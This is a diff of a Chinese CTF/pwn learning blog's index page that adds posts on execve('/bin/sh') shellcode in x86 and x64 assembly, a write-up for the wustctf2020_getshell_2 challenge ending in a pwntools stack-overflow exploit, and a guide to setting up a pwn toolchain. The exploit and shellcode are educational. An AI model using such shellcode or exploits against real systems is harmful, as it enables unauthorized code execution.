@@ -71,10 +71,217 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-shellcode学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time class="dt-published" datetime="2022-01-31T08:36:49.000Z" itemprop="datePublished">2022-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="shellcode部分"><a href="#shellcode部分" class="headerlink" title="shellcode部分"></a>shellcode部分</h2><p>最近碰到用汇编写shellcode的不少，所以记录一下部分函数的shellcode</p>
+<h3 id="64位execve-quot-bin-sh-quot-0-0"><a href="#64位execve-quot-bin-sh-quot-0-0" class="headerlink" title="64位execve(&quot;bin/sh&quot;,0,0)"></a>64位<code>execve(&quot;bin/sh&quot;,0,0)</code></h3><p>函数原型:<br><code>int execve(const char * filename,char * const argv[ ],char * const envp[ ])</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    rdi,rdi              <span class="comment"># 初始化 rdi = rsi = rdx = rax = 0</span></span><br><span class="line">xor    rsi,rsi              <span class="comment"># argv[] = 0</span></span><br><span class="line">xor    rdx,rdx              <span class="comment"># envp[] = 0</span></span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax                  <span class="comment"># \00截断</span></span><br><span class="line">mov rbx,<span class="number">0x68732f2f6e69622f</span>  <span class="comment"># /bin/sh 的ascll码</span></span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp              <span class="comment"># filename = /bin/sh</span></span><br><span class="line">mov    al,<span class="number">0x3b</span>              <span class="comment"># rax = 59(execve的系统调用号)</span></span><br><span class="line">syscall                     </span><br></pre></td></tr></table></figure>
+
+<h3 id="32位execve-quot-bin-sh-quot-0-0"><a href="#32位execve-quot-bin-sh-quot-0-0" class="headerlink" title="32位execve(&quot;bin/sh&quot;,0,0)"></a>32位<code>execve(&quot;bin/sh&quot;,0,0)</code></h3><p>函数原型:<br><code>int execve(const char* filename, char* const argv[ ], char* const envp[ ])</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx                 <span class="comment"># argv[] = 0</span></span><br><span class="line">xor edx,edx                 <span class="comment"># envp[] = 0</span></span><br><span class="line">push edx                    <span class="comment"># \00截断</span></span><br><span class="line">push <span class="number">0x68732f2f</span>             <span class="comment"># /sh</span></span><br><span class="line">push <span class="number">0x6e69622f</span>             <span class="comment"># /bin</span></span><br><span class="line">mov ebx,esp                 <span class="comment"># filename = /bin/sh</span></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,<span class="number">0xB</span>                  <span class="comment"># rax = 11(execve的系统调用号)</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="32位write-1-ebp-12-0x50"><a href="#32位write-1-ebp-12-0x50" class="headerlink" title="32位write(1,ebp+12,0x50)"></a>32位<code>write(1,ebp+12,0x50)</code></h3><p>函数原型：<br><code>ssize_t write(int fd, const void* buf, size_t count)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,[ebp+<span class="number">12</span>]            <span class="comment"># buf = ebp + 12 </span></span><br><span class="line">mov eax,<span class="number">0x4</span>;                <span class="comment"># eax = 4(write的系统调用号)</span></span><br><span class="line">mov bl,<span class="number">0x1</span>;                 <span class="comment"># fd = 1</span></span><br><span class="line">mov edx,<span class="number">0x30</span>                <span class="comment"># count = 0x30</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="32位read-0-ebp-12-0x50"><a href="#32位read-0-ebp-12-0x50" class="headerlink" title="32位read(0,ebp+12,0x50)"></a>32位<code>read(0,ebp+12,0x50)</code></h3><p>函数原型：<br><code>ssize_t read(int fd, const void* buf, size_t count)</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,[ebp+<span class="number">12</span>]            <span class="comment"># buf = ebp + 12 </span></span><br><span class="line">mov eax,<span class="number">0x3</span>;                <span class="comment"># eax = 3(read的系统调用号)</span></span><br><span class="line">mov bl,<span class="number">0x0</span>;                 <span class="comment"># fd = 0</span></span><br><span class="line">mov edx,<span class="number">0x30</span>                <span class="comment"># count = 0x30</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>64位系统调用为<code>syscall</code>;32位系统调用为<code>int 0x80</code></li>
+<li>64位参数存入顺序为<code>rdi,rsi,rdx...</code>,其中<code>rax</code>存储系统调用号；32位参数存入顺序为<code>ebx,ecx,edx...</code>,其中<code>eax</code>存储系统调用号</li>
+<li>数据在计算机内部采用小端序存储，所以数据都是从右向左读取，例如：<code>0x68732f2f6e69622f</code>,按习惯来看，是<code>hs/nib/</code>,但实际上是<code>/bin/sh</code></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/" data-id="ckz2fw2q200019kjx041zf31p" data-title="shellcode学习" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-wustctf2020-getshell-2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/30/wustctf2020-getshell-2/" class="article-date">
+  <time class="dt-published" datetime="2022-01-30T12:52:46.000Z" itemprop="datePublished">2022-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/30/wustctf2020-getshell-2/">wustctf2020_getshell_2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h2><p>先<code>checksec</code>一下</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/1.png"></p>
+<p>ok，<code>32位</code>，开了<code>NX</code>保护<br>丢到<code>ida</code>里看看</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/2.png"></p>
+<p>ok，很简洁，但有<code>vulnerable</code>函数，进去看看</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/3.png"></p>
+<p>也很简洁，就一个<code>read</code>函数，可以输入<code>0x24</code>个字节，栈的大小为<code>0x18</code>，可以溢出<code>0x24-0x18-4=8</code>个字节，显然不是那么简单的溢出</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/4.png"></p>
+<p>这里有个<code>shell</code>函数，里面有<code>system</code>，但没有<code>/bin/sh</code>字符串，但是<br>我们可以看到有个<code>sh</code><br>所以我们试试用<code>ROPgadget</code>找找</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/5.png"></p>
+<p>ok，还真有，这下简单了！<br>但是上面说了只能溢出8个字节，说以<code>system</code>函数只能用<code>sgell()</code>里面的<code>system call</code>，因为<code>system@plt</code>需要返回地址，<code>system call</code>不需要返回地址</p>
+<p><img src="/2022/01/30/wustctf2020-getshell-2/6.png"></p>
+<p>最后奉上exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level =<span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>,os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./wustctf2020_getshell_2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26053</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048529</span></span><br><span class="line">sh = <span class="number">0x08048670</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*<span class="number">28</span> + p32(system) + p32(sh)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/30/wustctf2020-getshell-2/7.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/30/wustctf2020-getshell-2/" data-id="ckz2fw2q600049kjxc15kdwag" data-title="wustctf2020_getshell_2" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-unbuntu18-04pwn环境搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
+  <time class="dt-published" datetime="2022-01-30T12:46:15.000Z" itemprop="datePublished">2022-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">unbuntu18.04pwn环境搭建</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>最近做题时unbuntu16.04崩了，搞了一下午都没有弄好，就自己重新装了unbuntu18.04和unbuntu20.04</p>
+<p>这里准备记录下自己的装机过程（以unbuntu18.04为例）</p>
+<p><strong>apt换源</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/apt/sources.<span class="built_in">list</span> /etc/apt/sources.<span class="built_in">list</span>.bak<span class="comment">#备份</span></span><br><span class="line">sudo gedit /etc/apt/sources.<span class="built_in">list</span></span><br><span class="line">直接百度对应版本的源</span><br><span class="line">复制粘贴覆盖到打开的sources.<span class="built_in">list</span>里</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
+
+<p>市面上比较火的是清华大学和阿里巴巴两款源，这里比较推荐阿里巴巴的，毕竟是一个企业，考虑的肯定更加周全些，下面是网址</p>
+<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.3e221b11RmIpkQ">ubuntu镜像-ubuntu下载地址-ubuntu安装教程-阿里巴巴开源镜像站 (aliyun.com)</a></p>
+<p><img src="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.png"></p>
+<p><strong>安装32位编译环境</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+
+<p>因为unbuntu本身没有32位的编译环境，所以需要我们自己安装</p>
+<p>pwntools安装(这里我自己用的python2)</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 安装低版本的pip</span></span><br><span class="line">apt install python</span><br><span class="line">apt install curl</span><br><span class="line">curl https:<span class="comment">//bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span></span><br><span class="line">sudo python <span class="keyword">get</span>-pip.py</span><br><span class="line"><span class="meta"># 安装依赖环境</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> install python-dev libssl-dev libffi-dev build-essential</span><br><span class="line"><span class="meta"># pip换源</span></span><br><span class="line">pip config <span class="keyword">set</span> <span class="keyword">global</span>.index-url https:<span class="comment">//mirrors.aliyun.com/pypi/simple/</span></span><br><span class="line">（如果找不到pip，就用python -m pip）</span><br><span class="line">pip install -U setuptools</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br><span class="line">pip install pathlib2</span><br></pre></td></tr></table></figure>
+
+<p>进入python，输入from pwn import * 不报错就算安装成功</p>
+<p><img src="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2.png"></p>
+<p><strong>安装checksec</strong></p>
+<p>一个辅助工具，可以用来检测二进制文件格式和安全防护情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install checksec</span><br></pre></td></tr></table></figure>
+
+<p><strong>pwndbg</strong></p>
+<p>这个也是需要的，毕竟gdb在没有插件的时候对用户实在是不怎么友好。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg </span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+
+<p><strong>pwngdb</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果不用peda的话</span><br><span class="line">subl .gdbinit</span><br><span class="line">把第一行改成 source ~/pwndbg/gdbinit.py 保存</span><br></pre></td></tr></table></figure>
+
+<p><strong>LibcSearcher</strong></p>
+<p>LibcSearcher是针对pwn做的python库，在做pwn题时寻找一些libc版本非常好用，不过好像现在有点疲软了。毕竟这个是对于python2写的，而且好久不维护了。开始的时候用着还可以，现在不大行了。想用还是可以用一下的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">sudo python setup.py develop</span><br></pre></td></tr></table></figure>
+
+<p><strong>Seccomp Tools(沙盒检测)</strong></p>
+<p>这是一个沙盒，后面学的深得话会用到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure>
+
+<p><strong>ROPgadget</strong></p>
+<p>便于你构造rop链的工具，不过好像安装pwntools之后会自动安装这个玩意。要是没有你就自己安装吧。输入Ropgadget验证一下就好</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
+
+<p><strong>one_gadget</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
+
+<p>也是构造rop链用的</p>
+<p><strong>Ropper keystone-engine安装</strong></p>
+<p>还是构造rop链用的，不过更详细</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#先安装keystone-engine</span><br><span class="line">apt install cmake</span><br><span class="line">git clone https://github.com/keystone-engine/keystone.git</span><br><span class="line">cd keystone</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../make-share.sh</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">cd ../bindings/python</span><br><span class="line">sudo make install3 # or sudo make install for python2-bindings</span><br><span class="line">#后安装Ropper</span><br><span class="line">sudo pip3 install filebytes==0.9.18</span><br><span class="line">git clone https://github.com/sashs/Ropper.git</span><br><span class="line">cd Ropper</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装libc-database</strong></p>
+<p>一个非常好用查找libc版本的git项目, 其实就是<code>https://libc.blukat.me/</code>这个网站里面的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#下载项目</span><br><span class="line">git clone https://github.com/niklasb/libc-database.git</span><br><span class="line"># 建立一个libc偏移量数据库 </span><br><span class="line">./get  # List categories</span><br><span class="line">./get ubuntu debian  # Download Ubuntu&#x27;s and Debian&#x27;s libc, old default behavior</span><br><span class="line">./get all  # Download all categories. Can take a while!</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" data-id="ckz2fw2q400029kjxakxqao27" data-title="unbuntu18.04pwn环境搭建" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-栈迁移" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="article-date">
-  <time class="dt-published" datetime="2022-01-25T14:29:07.000Z" itemprop="datePublished">2022-01-25</time>
+  <time class="dt-published" datetime="2022-01-24T22:29:07.000Z" itemprop="datePublished">2022-01-25</time>
 </a>
     
   </div>
@@ -136,7 +343,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="ckyu8hnyc00018gjxd1ot71hu" data-title="栈迁移" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="ckz2fw2q700059kjxd4rb567o" data-title="栈迁移" class="article-share-link">Share</a>
       
       
       
@@ -151,7 +358,7 @@
     <article id="post-添加模板" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/" class="article-date">
-  <time class="dt-published" datetime="2022-01-25T14:25:31.000Z" itemprop="datePublished">2022-01-25</time>
+  <time class="dt-published" datetime="2022-01-24T22:25:31.000Z" itemprop="datePublished">2022-01-25</time>
 </a>
     
   </div>
@@ -189,7 +396,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/" data-id="ckyu8hnye00028gjx48jr19ks" data-title="添加模板" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/" data-id="ckz2fw2q800069kjx16swgsxa" data-title="添加模板" class="article-share-link">Share</a>
       
       
       
@@ -204,7 +411,7 @@
     <article id="post-hexo-github博客搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="article-date">
-  <time class="dt-published" datetime="2022-01-25T14:07:40.000Z" itemprop="datePublished">2022-01-25</time>
+  <time class="dt-published" datetime="2022-01-24T22:07:40.000Z" itemprop="datePublished">2022-01-25</time>
 </a>
     
   </div>
@@ -286,7 +493,7 @@
 
 
 
-<p>上述命令中your github name是你的github用户名，<a href="mailto:&#121;&#x6f;&#117;&#x72;&#97;&#100;&#x64;&#x72;&#101;&#x73;&#x73;&#64;&#121;&#111;&#x75;&#114;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#121;&#x6f;&#117;&#x72;&#97;&#100;&#x64;&#x72;&#101;&#x73;&#x73;&#64;&#121;&#111;&#x75;&#114;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a>是你github的注册邮箱。</p>
+<p>上述命令中your github name是你的github用户名，<a href="mailto:&#121;&#x6f;&#x75;&#114;&#x61;&#x64;&#100;&#114;&#x65;&#x73;&#115;&#x40;&#x79;&#x6f;&#117;&#114;&#x65;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;">&#121;&#x6f;&#x75;&#114;&#x61;&#x64;&#100;&#114;&#x65;&#x73;&#115;&#x40;&#x79;&#x6f;&#117;&#114;&#x65;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#109;</a>是你github的注册邮箱。</p>
 <h2 id="4-Github-io部署博客"><a href="#4-Github-io部署博客" class="headerlink" title="4.Github.io部署博客"></a>4.Github.io部署博客</h2><h3 id="4-1-config-yml参数设置"><a href="#4-1-config-yml参数设置" class="headerlink" title="4.1_config.yml参数设置"></a>4.1_config.yml参数设置</h3><p>部署配置在_config.yml文件的末尾，默认样子如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line"> type:</span><br><span class="line"> repo:</span><br></pre></td></tr></table></figure>
 
@@ -306,7 +513,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" data-id="ckyu8hny700008gjx1dw49oc0" data-title="hexo+github博客搭建" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" data-id="ckz2fw2py00009kjx018qg65h" data-title="hexo+github博客搭建" class="article-share-link">Share</a>
       
       
       
@@ -328,9 +535,23 @@
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
@@ -349,15 +570,23 @@
       <ul>
         
           <li>
+            <a href="/2022/01/31/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/wustctf2020-getshell-2/">wustctf2020_getshell_2</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/30/unbuntu18-04pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">unbuntu18.04pwn环境搭建</a>
+          </li>
+        
+          <li>
             <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
           </li>
         
           <li>
             <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/">添加模板</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">hexo+github博客搭建</a>
           </li>
         
       </ul>
